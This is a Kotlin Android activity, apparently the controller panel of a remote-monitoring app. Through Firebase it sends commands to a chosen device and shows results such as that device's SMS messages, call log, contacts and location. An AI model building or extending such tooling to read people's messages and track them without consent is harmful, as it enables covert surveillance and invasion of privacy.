package com.abuzahra.control

import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import com.abuzahra.control.databinding.ActivityMainBinding
import com.abuzahra.control.model.CommandResult
import com.abuzahra.control.model.Device
import com.abuzahra.control.service.FirebaseService
import com.abuzahra.control.ui.dashboard.DashboardFragment
import com.abuzahra.control.ui.control.ControlFragment
import com.abuzahra.control.ui.smscalls.SmsCallsFragment
import com.abuzahra.control.ui.files.FilesFragment
import com.abuzahra.control.ui.social.SocialFragment
import com.abuzahra.control.ui.settings.SettingsFragment
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {
    private lateinit var b: ActivityMainBinding
    private var resultListener: ValueEventListener? = null

    companion object {
        var selectedDevice: Device? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            b = ActivityMainBinding.inflate(layoutInflater)
            setContentView(b.root)
        } catch (e: Exception) {
            Log.e("Main", "Binding error: ${e.message}")
            finish(); return
        }

        // Init Firebase service
        FirebaseService.init(this)

        b.bottomNav.setOnItemSelectedListener { item ->
            try {
                val frag = when (item.itemId) {
                    R.id.nav_dashboard -> DashboardFragment()
                    R.id.nav_control -> ControlFragment()
                    R.id.nav_sms_calls -> SmsCallsFragment()
                    R.id.nav_files -> FilesFragment()
                    R.id.nav_social -> SocialFragment()
                    R.id.nav_settings -> SettingsFragment()
                    else -> DashboardFragment()
                }
                supportFragmentManager.beginTransaction().replace(R.id.fragmentContainer, frag).commit()
            } catch (e: Exception) {
                Log.e("Main", "Fragment error: ${e.message}")
            }
            true
        }

        // Default fragment
        try {
            supportFragmentManager.beginTransaction().replace(R.id.fragmentContainer, DashboardFragment()).commit()
        } catch (e: Exception) {
            Log.e("Main", "Init fragment error: ${e.message}")
        }

        b.ivCloseResult.setOnClickListener { b.resultPanel.visibility = android.view.View.GONE }
    }

    fun selectDevice(device: Device) {
        selectedDevice = device
        b.tvTopTitle.text = device.name.ifEmpty { device.model }
        b.tvDeviceCount.text = if (device.isOnline) "متصل" else "غير متصل"
        b.ivDeviceStatus.setBackgroundResource(
            if (device.isOnline) R.drawable.bg_status_online else R.drawable.bg_status_offline
        )
        listenResults(device)
    }

    private fun listenResults(device: Device) {
        resultListener?.let { FirebaseService.removeResultListener(device.id, it) }
        resultListener = FirebaseService.listenForResult(device.id) { result ->
            if (result.status == "success" || result.status == "error") {
                runOnUiThread { showResult(result) }
            }
        }
    }

    private fun showResult(r: CommandResult) {
        b.resultPanel.visibility = android.view.View.VISIBLE
        b.tvResultTitle.text = when (r.command) {
            "get_sms" -> "📱 الرسائل"
            "get_calls" -> "📞 المكالمات"
            "get_contacts" -> "👤 جهات الاتصال"
            "get_location" -> "📍 الموقع"
            "get_info" -> "ℹ️ معلومات الجهاز"
            "get_battery" -> "🔋 البطارية"
            else -> "📋 ${r.command}"
        }
        b.tvResultContent.text = if (r.result.length > 3000) r.result.take(3000) + "\n...(مقتطع)" else r.result
    }

    fun sendCommand(command: String, params: String = "") {
        val dev = selectedDevice
        if (dev == null) { Toast.makeText(this, "اختر جهازاً أولاً", Toast.LENGTH_SHORT).show(); return }
        Toast.makeText(this, "جاري الإرسال: $command", Toast.LENGTH_SHORT).show()
        FirebaseService.sendCommand(dev.id, command, params) { ok ->
            runOnUiThread { Toast.makeText(this, if (ok) "تم الإرسال ✅" else "فشل ❌", Toast.LENGTH_SHORT).show() }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        resultListener?.let { selectedDevice?.let { d -> FirebaseService.removeResultListener(d.id, it) } }
    }
}
